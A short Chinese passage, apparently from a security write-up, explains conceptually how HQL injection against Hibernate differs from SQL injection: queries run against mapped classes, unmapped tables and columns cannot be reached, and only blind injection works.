但是由于Hibernate是通过映射实体到数据库进行查询的，所以不全是SQL注入。查询资料发现，是HQL注入

HQL vs SQL

HQL 查询语句是面向对象的, Hibernate 负责解析 HQL 查询语句, 然后根据对象-关系映射文件中的映射信息, 把 HQL 查询语句翻译成相应的 SQL 语句。HQL 查询语句中的主体是域模型中的类(库表)及类的属性(字段信息)。

SQL 查询语句是与关系数据库绑定在一起的。SQL 查询语句中的主体是数据库表及表的字段。

关于HQL语句的学习可以看这篇page

没有在xml中做映射的表是无法查询的，未映射的列也是无法查询的。如果读不到hibernate.cfg.xml的内容，常常会发现自己几乎连数据拓扑结构都猜不对，也就是说HQL是有很大限制的。

并且只能够盲注，因为HQL注入的原理和SQL注入不太一样，它将注入语句也作为正常语句查询，并不打断原有逻辑(不加引号)
